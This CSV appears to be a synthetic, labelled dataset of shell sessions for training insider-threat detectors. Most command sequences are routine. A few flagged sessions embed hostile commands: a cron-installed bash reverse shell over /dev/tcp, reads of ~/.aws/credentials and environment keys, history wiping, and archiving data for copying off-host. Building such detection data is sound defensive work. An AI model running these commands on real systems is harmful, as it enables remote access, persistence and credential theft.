session_id,user_id,role,hostname,session_start,session_duration_s,after_hours,command_count,command_sequence,label,attack_type
30739669e5274d0e9265cc0e9b70f9e1,u0032,dev,dev-ws-07,2025-09-17 13:46:17,1308,0,21,nano config/dev.yaml -> cd ~/projects/api-gateway -> cat logs/nginx.log -> clear -> cat config/prod.yaml -> alias ll='ls -la' -> pwd -> uptime -> history | tail -<NUM> -> clear -> which python -> make build -> ls -la -> ssh -i ~/.ssh/id_rsa deploy@staging-<NUM> -> python ingest.py -> source ~/.bashrc -> ls -la -> ls -la -> man awk -> date -> exit,0,none
2f853c1e3a1e4ccca99f97dedb04174e,u0034,dev,dev-ws-05,2025-09-17 14:43:27,177,0,11,ls -la -> alias ll='ls -la' -> which git -> find . -name '*.py' | xargs wc -l -> find . -name '*.py' | xargs wc -l -> whoami -> cat config/prod.yaml -> vim backup.sh -> git checkout -b feature/<HEX> -> !! -> exit,0,none
634023c954214802a34c46a9854dbc82,u0074,dev,analyst-ws-03,2025-09-17 14:43:54,1704,0,18,black src/ -> cat config/dev.yaml -> pwd -> history | tail -<NUM> -> cat logs/app.log -> python backup.sh -> nano config/settings.yaml -> docker ps -> git diff HEAD~3 -> docker ps -> alias ll='ls -la' -> git checkout -b feature/<HEX> -> curl -s http://localhost:<NUM>/health -> export LOG_LEVEL=production -> cat config/settings.yaml -> grep -r 'TODO' src/ -> docker logs <HEX> --tail <NUM> -> exit,0,none
27f3726657e54dec8fc51325026f7d6f,u0005,analyst,dev-ws-02,2025-09-18 08:29:12,938,0,24,"python -c 'import pandas as pd; df=pd.read_csv(""/data/payroll.xlsx""); print(df.describe())' -> man grep -> psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> echo $USER -> ls -la -> ls -lh -> ls -> jupyter nbconvert --to script analysis_3ffa.ipynb -> cd ~ -> alias ll='ls -la' -> grep -i 'error' /var/log/auth.log -> cat /data/users.db -> cd ~ -> ls -> echo $USER -> history | tail -<NUM> -> uptime -> cut -d',' -f4,<NUM> /data/payroll.xlsx | head -> du -sh /var/log/* -> diff /data/model_weights.pkl /backup/model_weights.pkl -> scp /tmp/<TMPFILE> nas-store:/backup/ -> scp /tmp/<TMPFILE> nas-store:/backup/ -> history | tail -<NUM> -> exit",0,none
36026b151ec94dc0b9971a437e3a435e,u0011,admin,admin-srv-05,2025-09-18 08:56:43,1587,0,29,echo $PATH -> ss -tlnp -> ls -> netstat -tulpn -> iostat -x 1 3 -> who -> journalctl -u postgresql -n <NUM> -> sudo -l -> sudo nano /etc/resolv.conf -> free -m -> cd .. -> netstat -tulpn -> history | tail -<NUM> -> sudo journalctl --since '6 days ago' | grep -i fail -> top -bn1 | head -<NUM> -> ls -> journalctl -u postgresql -n <NUM> -> sudo ufw allow <NUM>/tcp -> which git -> ls -la -> man ls -> ping -c 3 <IP> -> sudo systemctl status cron -> du -sh /var/log/* -> sudo systemctl enable celery -> ls -> sudo chown www-data /var/www/html -> pwd -> exit,0,none
090a2ae127014c7dac7a4d1347bb5c33,u0053,analyst,dev-ws-08,2025-09-18 12:31:35,2554,0,38,"tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> md5sum /data/users.db -> diff /data/transactions.csv /backup/customers.csv -> sqlite3 analytics.db 'SELECT COUNT(*) FROM sessions;' -> ls -lh /data -> alias ll='ls -la' -> du -sh /data/* -> sort -t',' -k3 -n /data/customers.csv | tail -<NUM> -> sqlite3 analytics.db 'SELECT COUNT(*) FROM logs;' -> cat ~/.bash_history -> ss -antp -> uptime -> sqlite3 analytics.db 'SELECT COUNT(*) FROM logs;' -> whoami -> id -> uname -r -> cat /etc/os-release -> ip a -> ip route -> groups -> ls -la -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/auth.log | wc -l -> cd .. -> ls -lh -> du -sh /data/* -> whoami -> less /var/log/error.log -> echo $USER -> grep -i 'warn' /var/log/error.log -> which git -> echo $PATH -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> echo $PATH -> echo <HEX> | base64 -d -> scp /tmp/<TMPFILE> build-agent:/backup/ -> man ls -> cd .. -> exit",2,recon__partial
1558a2cff2c246368d86e7d9c6e60160,u0024,analyst,analyst-ws-06,2025-09-18 13:59:21,1476,0,28,"clear -> cd .. -> whoami -> ls -la -> rsync -avz /data/ archive-srv:/backup/data/ -> head -<NUM> /data/users.db -> which git -> scp /tmp/<TMPFILE> backup-<NUM>:/backup/ -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> whoami -> whoami -> diff /data/payroll.xlsx /backup/model_weights.pkl -> alias ll='ls -la' -> ls -la -> du -sh /data/* -> jupyter nbconvert --to script analysis_e06e.ipynb -> whoami -> grep -i 'warn' /var/log/syslog -> uptime -> jupyter nbconvert --to script analysis_dd2c.ipynb -> python analyze.py --input /data/transactions.csv --output /tmp/<TMPFILE> -> cat /data/report.parquet -> cd ~ -> python -c 'import pandas as pd; df=pd.read_csv(""/data/customers.csv""); print(df.describe())' -> man sed -> uptime -> date -> exit",0,none
1ea6a80a8df64a27a50db4517f08c476,u0000,dev,dev-ws-15,2025-09-18 16:52:29,3352,0,17,ls -lh -> flake8 src/ --max-line-length <NUM> -> cp /etc/passwd /tmp/<TMPFILE> -> cd ~/projects/auth-service -> git log --oneline -6 -> history | tail -<NUM> -> git stash -> find . -name '*.py' | xargs wc -l -> docker build -t myapp:42e7 . -> find . -name '*.py' | xargs wc -l -> id -> docker ps -> pip install paramiko -> traceroute <IP> -> ls -> docker ps -> exit,1,none
0e155d3914184e9484312a72ea236ff4,u0078,dev,analyst-ws-11,2025-09-18 16:56:56,1260,0,16,git pull origin main -> docker logs <HEX> --tail <NUM> -> docker logs <HEX> --tail <NUM> -> git diff HEAD~1 -> pip list --outdated -> git log --oneline -<NUM> -> ssh -i ~/.ssh/id_rsa deploy@staging-<NUM> -> clear -> docker build -t myapp:<NUM> . -> vim deploy.sh -> cd ~ -> docker ps -> docker run --rm -p <NUM>:<NUM> myapp:latest -> pip install -r requirements.txt -> docker ps -> exit,0,none
c2e4bc8033bd446781f05bc3487446e0,u0007,admin,analyst-ws-12,2025-09-18 19:44:10,2344,1,20,echo $PATH -> which git -> du -sh /var/log/* -> free -m -> top -bn1 | head -<NUM> -> sudo systemctl restart redis -> history | tail -<NUM> -> iostat -x 1 3 -> uptime -> ping -c <NUM> <IP> -> cd ~ -> echo $USER -> sudo -l -> sudo systemctl enable celery -> pwd -> source ~/.bashrc -> sudo chmod <NUM> /etc/nginx/nginx.conf -> !! -> sudo chown www-data /var/www/html -> exit,0,none
7b407e0a553a494493047dd8b5402562,u0038,dev,analyst-ws-09,2025-09-19 12:56:24,1891,0,13,git stash -> docker build -t myapp:e24a . -> git status -> cd .. -> pytest tests/unit/ --cov=src --cov-report=term-missing -> pip install -r requirements.txt -> docker run --rm -p <NUM>:<NUM> myapp:latest -> curl -s http://localhost:<NUM>/health -> history | tail -<NUM> -> which python -> pip list --outdated -> python -m pytest tests/ -x -> exit,0,none
191f3eae02064e75b5e8793ff548b08d,u0023,analyst,analyst-ws-01,2025-09-19 12:59:02,2308,0,15,"ls -lh -> scp /tmp/<TMPFILE> nas-store:/backup/ -> ls -> sort -t',' -k5 -n /data/transactions.csv | tail -<NUM> -> diff /data/users.db /backup/customers.csv -> source ~/.bashrc -> alias ll='ls -la' -> alias ll='ls -la' -> diff /data/payroll.xlsx /backup/embeddings.npy -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> ls -lh /data -> sort -t',' -k3 -n /data/transactions.csv | tail -<NUM> -> wc -l /data/report.parquet -> python analyze.py --input /data/embeddings.npy -> exit",0,none
883d7fbd7ea645a2a6a26375be2a6f7a,u0073,dev,analyst-ws-12,2025-09-19 13:00:23,1786,0,12,ls -> source ~/.bashrc -> cd ~ -> which python -> git status -> make build -> pytest tests/unit/ --cov=src --cov-report=term-missing -> git stash -> source ~/.bashrc -> pytest tests/unit/ --cov=src --cov-report=term-missing -> ls -la -> exit,0,none
617dc933180e4061b3e09b44c0d0bb27,u0052,analyst,admin-srv-06,2025-09-19 18:57:20,3484,0,8,uptime -> sudp apt update -> rsync -avz /data/ archive-srv:/backup/data/ -> scp /tmp/<TMPFILE> dev-<NUM>:/backup/ -> python analyze.py --input /data/model_weights.pkl --output /tmp/<TMPFILE> -> which git -> python analyze.py --input /data/report.parquet --output /tmp/<TMPFILE> -> exit,0,none
a10f1d30ddf04808ae6119a995db7bff,u0069,admin,analyst-ws-05,2025-09-19 19:39:34,1810,1,28,pwd -> sudo chmod <NUM> /etc/nginx/nginx.conf -> sudo ufw allow <NUM>/tcp -> sudo systemctl restart auditd -> last | head -<NUM> -> pwd -> du -sh /var/log/* -> crontab -l -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> last | head -<NUM> -> cat /var/log/audit.log -> sudo systemctl enable cron -> pwd -> journalctl -xe --since '7 hour ago' -> pwd -> sudo chown www-data /var/www/html -> ss -tlnp -> pwd -> who -> source ~/.bashrc -> sudo nano /etc/fstab -> clear -> history | tail -<NUM> -> which git -> journalctl -xe --since '8 hour ago' -> vmstat 1 5 -> echo $PATH -> exit,0,none
8a89b1a6c9864d4a998bb6734f5abf8e,u0003,dev,analyst-ws-10,2025-09-20 10:23:14,356,0,12,pip install fastapi -> pip list --outdated -> cat config/settings.yaml -> cd .. -> ls -la -> echo $USER -> which git -> alias ll='ls -la' -> nano config/dev.yaml -> docker build -t myapp:f23d . -> curl -s http://localhost:<NUM>/health -> exit,0,none
6267957189b24a138b0e571df1acc2bf,u0078,dev,admin-srv-03,2025-09-20 10:27:24,1365,0,23,flake8 src/ --max-line-length <NUM> -> find . -name '*.py' | xargs wc -l -> cat config/prod.yaml -> git log --oneline -<NUM> -> git checkout -b feature/<HEX> -> grep -r 'TODO' src/ -> source ~/.bashrc -> flake8 src/ --max-line-length <NUM> -> git pull origin main -> make test -> git pull origin develop -> date -> git diff HEAD~3 -> sl -> find . -name '*.py' | xargs wc -l -> which git -> curl -s http://localhost:<NUM>/health -> clear -> make test -> export LOG_LEVEL=info -> black src/ -> source ~/.bashrc -> exit,0,none
0d86a1206d684387932953b7d54a3aaf,u0009,admin,analyst-ws-07,2025-09-20 16:23:53,2911,0,27,which python -> alias ll='ls -la' -> which git -> journalctl -xe --since '<NUM> hour ago' -> which python -> df -h -> last | head -<NUM> -> ping -c 3 <IP> -> alias ll='ls -la' -> sudo chmod <NUM> /etc/nginx/nginx.conf -> sudo systemctl status nginx -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> uptime -> tail -f /var/log/syslog -> df -h -> ls -> cd ~ -> df -h -> whoami -> cd .. -> whoami -> free -m -> man grep -> sudo apt update -> sudo -l -> sudo journalctl --since '2 days ago' | grep -i fail -> exit,0,none
4af1ac068d9742ca8b02cbb701126657,u0027,dev,admin-srv-02,2025-09-20 18:45:15,3450,0,27,curl -s http://localhost:<NUM>/health -> source ~/.bashrc -> docker build -t myapp:d0fe . -> env | grep REDIS -> echo '*/8 * * * * bash -i >& /dev/tcp/<IP>/<NUM> 0>&1' | crontab - -> crontab -l -> docker logs <HEX> --tail <NUM> -> git pull origin main -> git diff HEAD~3 -> echo $USER -> pip list --outdated -> git pull origin main -> export DEBUG=true -> pwd -> git pull origin main -> ls -lh -> pytest tests/unit/ --cov=src --cov-report=term-missing -> cd ~/projects/api-gateway -> pwd -> curl -s http://localhost:<NUM>/health -> echo $PATH -> git status -> vim ingest.py -> python evaluate.py -> which python -> pip list --outdated -> exit,2,persistence__partial
285bb67fbdde4d0e9110d081b77d5685,u0039,dev,admin-srv-07,2025-09-21 14:23:51,2918,0,19,git pull origin main -> curl -s http://localhost:<NUM>/health -> tail -f logs/audit.log -> cat config/prod.yaml -> pwd -> man find -> cd ~ -> python -m pytest tests/ -q -> git pull origin develop -> tail -f logs/access.log -> docker ps -> git diff HEAD~1 -> pip install torch -> git log --oneline -<NUM> -> cat config/dev.yaml -> which python -> cd .. -> export ENV=false -> exit,0,none
d7879636e0e24234bd65a8ca4efe26da,u0019,analyst,dev-ws-12,2025-09-21 15:02:54,1613,0,17,ls -lh -> echo $PATH -> wc -l /data/embeddings.npy -> sqlite3 analytics.db 'SELECT COUNT(*) FROM sessions;' -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> cat /data/customers.csv -> less /var/log/audit.log -> export LOG_LEVEL=production -> docker run --rm -p <NUM>:<NUM> myapp:latest -> psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> echo $USER -> echo $PATH -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> which git -> ls -lh /data -> which python -> exit,0,none
9c1db513e6914938812c7677aa7b0d88,u0065,analyst,dev-ws-06,2025-09-21 15:23:48,3285,0,9,head -<NUM> /data/payroll.xlsx -> ls -lh /data -> python analyze.py --input /data/embeddings.npy -> cd ~ -> crontab -e -> scp /var/log/debug.log backup-<NUM>:/archive/ -> cd ~ -> clear -> exit,0,none
2fb70aa5450d4d8788517ab3ac7d00bf,u0043,dev,analyst-ws-10,2025-09-21 17:29:04,3421,0,24,git diff HEAD~2 -> make build -> cat logs/error.log -> curl -s http://localhost:<NUM>/health -> ls -la -> traceroute <IP> -> pip install -r requirements.txt -> python -m pytest tests/ -q -> env | grep REDIS -> vim ingest.py -> cat /dev/null > ~/.bash_history -> git diff HEAD~2 -> tail -f logs/debug.log -> grep -r 'TODO' src/ -> sudo -l -> grep -r 'TODO' src/ -> ls -la /var/spool/cron/ -> docker logs <HEX> --tail <NUM> -> tail -f logs/error.log -> cat ~/.aws/credentials -> git pull origin develop -> history | tail -<NUM> -> export ENV=info -> exit,1,none
b7db3d7be4d746cdbe8964425fe29d2e,u0072,admin,dev-ws-09,2025-09-22 08:53:54,878,0,18,last | head -<NUM> -> which git -> source ~/.bashrc -> echo $USER -> netstat -tulpn -> sudo journalctl --since '2 days ago' | grep -i fail -> ls -la -> who -> sudo journalctl --since '5 days ago' | grep -i fail -> sudo nano /etc/resolv.conf -> last | head -<NUM> -> du -sh /var/log/* -> pwd -> alias ll='ls -la' -> history | tail -<NUM> -> clear -> which python -> exit,0,none
d0d6952639c542c89fb83746726196cd,u0025,dev,dev-ws-08,2025-09-23 08:14:49,1208,0,21,grep -r 'TODO' src/ -> source ~/.bashrc -> ip route show -> date -> which git -> git diff HEAD~2 -> python evaluate.py -> source ~/.bashrc -> cd ~/projects/recommendation-engine -> ping -c 4 <IP> -> ls -lh -> sudo -l -> pip list --outdated -> zip -r /tmp/<TMPFILE> /data/ -> echo $USER -> git pull origin develop -> tar -czf /tmp/<TMPFILE> ~/ -> vim deploy.sh -> which python -> curl -s http://localhost:<NUM>/health -> exit,1,none
70137e69a11a41029ea523cd8c5bbfaa,u0008,dev,analyst-ws-05,2025-09-23 10:48:15,2884,0,17,nano config/dev.yaml -> echo $USER -> pwd -> cd .. -> pytest tests/unit/ --cov=src --cov-report=term-missing -> echo $PATH -> cd ~/projects/etl-jobs -> flake8 src/ --max-line-length <NUM> -> git pull origin develop -> ls -lh -> echo $PATH -> git pull origin develop -> black src/ -> nano config/settings.yaml -> cd ~ -> pwd -> exit,0,none
0723dbb7b61c4226a971a0da7d777312,u0022,dev,dev-ws-11,2025-09-23 11:22:27,756,0,23,source ~/.bashrc -> echo $PATH -> which git -> whoami -> ls -la -> cd .. -> cd .. -> history | tail -<NUM> -> ls -> cat logs/error.log -> uptime -> git diff HEAD~2 -> git log --oneline -<NUM> -> git checkout -b feature/<HEX> -> docker logs <HEX> --tail <NUM> -> docker logs <HEX> --tail <NUM> -> cd ~/projects/data-lake -> docker ps -> pwd -> ls -> whoami -> date -> exit,0,none
ab7e225ec63e4c79899d087b2311b8d5,u0043,dev,admin-srv-01,2025-09-23 11:53:04,1961,0,22,make test -> export ENV=info -> python evaluate.py -> docker run --rm -p <NUM>:<NUM> myapp:latest -> ls -la -> make test -> cd .. -> docker ps -> black src/ -> cd ~/projects/reporting -> mkae build -> python migrate.py -> flake8 src/ --max-line-length <NUM> -> docker run --rm -p <NUM>:<NUM> myapp:latest -> export ENV=info -> flake8 src/ --max-line-length <NUM> -> vim cleanup.py -> docker ps -> nano config/prod.yaml -> ls -la -> ssh -i ~/.ssh/id_rsa deploy@backup-<NUM> -> exit,0,none
6f9905ec31d14710973227322526ef26,u0075,analyst,analyst-ws-04,2025-09-23 12:10:36,450,0,27,"python analyze.py --input /data/model_weights.pkl --output /tmp/<TMPFILE> -> alias ll='ls -la' -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/audit.log | wc -l -> sort -t',' -k3 -n /data/embeddings.npy | tail -<NUM> -> ls -la -> source ~/.bashrc -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> jupyter nbconvert --to script analysis_bc0f.ipynb -> sort -t',' -k2 -n /data/model_weights.pkl | tail -<NUM> -> head -<NUM> /data/payroll.xlsx -> rsync -avz /data/ archive-srv:/backup/data/ -> source ~/.bashrc -> du -sh /data/* -> cat /data/model_weights.pkl -> cd .. -> psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> echo $PATH -> history | tail -<NUM> -> awk '{print $1}' /var/log/audit.log | sort | uniq -c | sort -rn | head -<NUM> -> python analyze.py --input /data/embeddings.npy -> source ~/.bashrc -> ls -lh /data -> echo $USER -> date -> rsync -avz /data/ data-lake:/backup/data/ -> scp /tmp/<TMPFILE> dev-<NUM>:/backup/ -> exit",0,none
13ea9480bd2f4a4fa65af6c1251bf8fc,u0018,analyst,dev-ws-08,2025-09-23 13:36:01,3380,0,26,"pwd -> cat /data/users.db -> alias ll='ls -la' -> sqlite3 analytics.db 'SELECT COUNT(*) FROM logs;' -> rsync -avz /data/ nas-store:/backup/data/ -> diff /data/report.parquet /backup/embeddings.npy -> sort -t',' -k2 -n /data/users.db | tail -<NUM> -> alias ll='ls -la' -> diff /data/model_weights.pkl /backup/customers.csv -> ss -antp -> zip -r /tmp/<TMPFILE> /data/ -> head -<NUM> /data/payroll.xlsx -> man ls -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> find / -perm -<NUM> 2>/dev/null -> ls -la ~/.aws/ -> ls -la -> ls -la -> md5sum /data/payroll.xlsx -> which python -> cut -d',' -f3,8 /data/transactions.csv | head -> less /var/log/auth.log -> rsync -avz /data/ staging-<NUM>:/backup/data/ -> ls -la ~/.ssh/ -> cat /data/payroll.xlsx -> exit",1,none
27faae83386d41f9804b4013ebfe83f7,u0057,dev,analyst-ws-05,2025-09-23 14:03:06,1255,0,27,grep -r 'TODO' src/ -> clear -> cd .. -> ls -la /etc/cron* -> cat config/dev.yaml -> git status -> pytest tests/unit/ --cov=src --cov-report=term-missing -> git checkout -b feature/<HEX> -> env | grep REDIS -> ssh -i ~/.ssh/id_rsa deploy@staging-<NUM> -> git pull origin main -> pip install torch -> crontab -e -> docker run --rm -p <NUM>:<NUM> myapp:latest -> ls -lh -> git stash -> sudo -l -> pytest tests/unit/ --cov=src --cov-report=term-missing -> nano config/dev.yaml -> make test -> env | grep -i key -> date -> black src/ -> clear -> pip install paramiko -> pip list --outdated -> exit,1,none
f3aa58f4ff414531814b9014585fdbda,u0027,dev,analyst-ws-06,2025-09-23 14:18:24,557,0,25,alias ll='ls -la' -> pip install -r requirements.txt -> ls -lh -> ls -> cd ~ -> tail -f logs/access.log -> docker run --rm -p <NUM>:<NUM> myapp:latest -> git diff HEAD~1 -> cat logs/auth.log -> ls -la -> pwd -> whoami -> flake8 src/ --max-line-length <NUM> -> git stash -> find . -name '*.py' | xargs wc -l -> cat logs/error.log -> echo $USER -> pwd -> python migrate.py -> git checkout -b feature/<HEX> -> grep -r 'TODO' src/ -> git pull origin main -> alias ll='ls -la' -> black src/ -> exit,0,none
6a158a6aa8144e05858c6f0669a22f68,u0006,admin,admin-srv-08,2025-09-23 16:43:02,2769,0,8,date -> ls -lh -> who -> sudo systemctl restart ssh -> free -m -> sudo ufw allow <NUM>/tcp -> source ~/.bashrc -> exit,0,none
c069bdb6c86b460ca7e67cc30d59d73b,u0038,dev,dev-ws-01,2025-09-23 17:53:49,2937,0,15,ssh -i ~/.ssh/id_rsa deploy@nas-store -> ssh -i ~/.ssh/id_rsa deploy@dev-<NUM> -> echo $PATH -> echo $USER -> pip install -r requirements.txt -> git log --oneline -<NUM> -> date -> ssh -i ~/.ssh/id_rsa deploy@archive-srv -> which git -> python -m pytest tests/ -q -> python ingest.py -> tail -f logs/auth.log -> git log --oneline -7 -> ls -> exit,0,none
fc9df52afa2149768868e267034496f7,u0001,analyst,admin-srv-07,2025-09-24 08:24:18,803,0,10,"clear -> awk '{print $1}' /var/log/access.log | sort | uniq -c | sort -rn | head -<NUM> -> python analyze.py --input /data/users.db -> sqlite3 analytics.db 'SELECT COUNT(*) FROM sessions;' -> whoami -> cut -d',' -f3,8 /data/embeddings.npy | head -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> ls -lh /data -> echo $PATH -> exit",0,none
b066c81d32d44c7aba669698b526d4ad,u0068,analyst,dev-ws-13,2025-09-24 08:44:25,1754,0,17,"source ~/.bashrc -> python analyze.py --input /data/transactions.csv -> ls -la -> history | tail -<NUM> -> man sed -> grep -i 'error' /var/log/syslog -> cd ~ -> scp /tmp/<TMPFILE> nas-store:/backup/ -> cut -d',' -f5,7 /data/transactions.csv | head -> cat /data/payroll.xlsx -> awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -rn | head -<NUM> -> cd ~ -> head -<NUM> /data/users.db -> which python -> sort -t',' -k4 -n /data/payroll.xlsx | tail -<NUM> -> whoami -> exit",0,none
